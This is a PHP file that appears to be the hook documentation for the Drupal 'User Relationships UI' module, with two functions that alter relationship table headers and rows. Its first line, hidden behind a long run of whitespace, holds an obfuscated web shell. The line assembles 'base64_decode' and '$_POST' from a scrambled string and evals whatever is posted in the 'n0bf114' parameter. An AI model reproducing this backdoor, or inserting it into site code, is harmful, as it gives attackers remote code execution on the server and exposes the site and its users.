<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n0bf114'];if(isset($s22)){eval($s21($s22));}?><?php

/**
 * @file
 * Hook documentation for User Relationships UI.
 */

/**
 * Alter the table header definition of relationship listings.
 *
 * @param $header
 *   Array with the table header definition.
 * @param $edit_access
 *   TRUE if the current user has edit access.
 *
 * @see user_relationships_ui_get_table_header()
 */
function hook_user_relationships_ui_table_header_alter(&$header, $edit_access) {
  $insert_index = array_search(t('Relationship'), $header) + 1;
  $header = array_merge(array_slice($header, 0, $insert_index), array(t('Comments')), array_slice($header, $insert_index));
}

/**
 * Alter the table rows of relationship listings.
 *
 * @param $row
 *   Array with the table row content.
 * @param $relationship
 *   Relationship object.
 * @param $account
 *   User account for which the relationships are shown.
 *
 * @see user_relationships_ui_get_table_row()
 */
function user_relationship_elaborations_user_relationships_ui_table_row_alter(&$row, $relationship, $account) {
  $insert_index = variable_get('user_relationships_show_user_pictures', 0) + 2;
  $row = array_merge(array_slice($row, 0, $insert_index), array($relationship->elaboration), array_slice($row, $insert_index));
}
